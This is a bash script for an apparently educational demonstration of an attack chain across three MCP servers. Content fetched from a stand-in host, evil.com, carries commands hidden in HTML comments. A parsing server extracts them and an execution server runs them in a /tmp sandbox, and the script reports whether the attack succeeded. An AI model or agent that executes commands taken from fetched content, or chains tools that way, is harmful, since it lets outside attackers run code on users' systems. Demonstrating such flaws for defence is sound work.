#!/bin/bash

# MCP Security Demo - Complete Attack Chain Test
# This script demonstrates the end-to-end vulnerability

set -e

cd "$(dirname "$0")/.."

echo "🎯 MCP SECURITY DEMONSTRATION"
echo "============================================================"
echo "⚠️  Educational demonstration of vulnerability chain"
echo "============================================================"
echo ""

# Clean sandbox
echo "Preparing sandbox..."
rm -f /tmp/mcp-demo-sandbox/*
echo "✓ Sandbox cleaned"
echo ""

# Step 1: Fetch malicious content
echo "Step 1: Fetching content from Server 1 (Unsafe Input)"
echo "  URL: http://evil.com/malicious"
echo ""

SERVER1_OUTPUT=$(echo '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"fetch_content","arguments":{"url":"http://evil.com/malicious"}}}' \
  | node servers/01-unsafe-input-server/dist/index.js 2>/dev/null)

HTML_CONTENT=$(echo "$SERVER1_OUTPUT" | jq -r '.result.content[0].text' | jq -r '.content')

echo "  ✓ Response received"
echo "  Contains HTML with hidden payload in comment"
echo ""

# Step 2: Parse content
echo "Step 2: Parsing content with Server 2 (Processing)"
echo ""

PARSE_REQ=$(jq -n --arg content "$HTML_CONTENT" '{
  jsonrpc: "2.0",
  id: 2,
  method: "tools/call",
  params: {
    name: "parse_markdown",
    arguments: {
      content: $content
    }
  }
}')

PARSE_OUTPUT=$(echo "$PARSE_REQ" | node servers/02-processing-server/dist/index.js 2>/dev/null)
BLOCKS=$(echo "$PARSE_OUTPUT" | jq -r '.result.content[0].text' | jq -r '.blocks')

EXTRACT_REQ=$(jq -n --argjson blocks "$BLOCKS" '{
  jsonrpc: "2.0",
  id: 3,
  method: "tools/call",
  params: {
    name: "extract_commands",
    arguments: {
      blocks: $blocks
    }
  }
}')

EXTRACT_OUTPUT=$(echo "$EXTRACT_REQ" | node servers/02-processing-server/dist/index.js 2>/dev/null)
COMMANDS=$(echo "$EXTRACT_OUTPUT" | jq -r '.result.content[0].text' | jq -r '.commands')

echo "  ⚠️  Extracted commands from HTML comments:"
echo "$COMMANDS" | jq -r '.[] | "     - \(.code) [Risk: \(.risk)]"'
echo ""

# Step 3: Execute commands
echo "Step 3: Executing commands with Server 3 (Execution)"
echo ""

EXECUTED=0
BLOCKED=0

for cmd in $(echo "$COMMANDS" | jq -r '.[].code'); do
  echo "  Executing: $cmd"

  EXEC_OUTPUT=$(echo "{\"jsonrpc\":\"2.0\",\"id\":4,\"method\":\"tools/call\",\"params\":{\"name\":\"execute_command\",\"arguments\":{\"command\":\"$cmd\"}}}" \
    | node servers/03-execution-server/dist/index.js 2>/dev/null)

  SUCCESS=$(echo "$EXEC_OUTPUT" | jq -r '.result.content[0].text' | jq -r '.success')
  BLOCKED_FLAG=$(echo "$EXEC_OUTPUT" | jq -r '.result.content[0].text' | jq -r '.blocked // false')

  if [ "$SUCCESS" = "true" ]; then
    echo "  ✓ Executed successfully"
    EXECUTED=$((EXECUTED + 1))
  elif [ "$BLOCKED_FLAG" = "true" ]; then
    echo "  ✗ Blocked"
    BLOCKED=$((BLOCKED + 1))
  else
    echo "  ✗ Failed"
  fi
done

echo ""

# Step 4: Verify results
echo "Step 4: Verifying attack results"
echo ""

FILES_OUTPUT=$(echo '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"list_sandbox_files","arguments":{}}}' \
  | node servers/03-execution-server/dist/index.js 2>/dev/null)

FILES=$(echo "$FILES_OUTPUT" | jq -r '.result.content[0].text' | jq -r '.files[]')
FILE_COUNT=$(echo "$FILES_OUTPUT" | jq -r '.result.content[0].text' | jq -r '.count')

echo "  Sandbox directory: /tmp/mcp-demo-sandbox"
echo "  Files created:"
for file in $FILES; do
  echo "    - $file"
done

echo ""
echo "============================================================"

if [ "$FILE_COUNT" -gt 0 ]; then
  echo "🚨 ATTACK SUCCESSFUL 🚨"
  echo ""
  echo "Malicious code was executed through the MCP chain:"
  echo "  1. Server 1 fetched malicious HTML (no validation)"
  echo "  2. Server 2 extracted commands (flagged but not blocked)"
  echo "  3. Server 3 executed commands (trusted Server 2)"
  echo ""
  echo "Commands executed: $EXECUTED"
  echo "Commands blocked: $BLOCKED"
  echo "Files created: $FILE_COUNT"
else
  echo "✓ ATTACK BLOCKED"
  echo "Security measures prevented execution"
fi

echo "============================================================"
echo ""
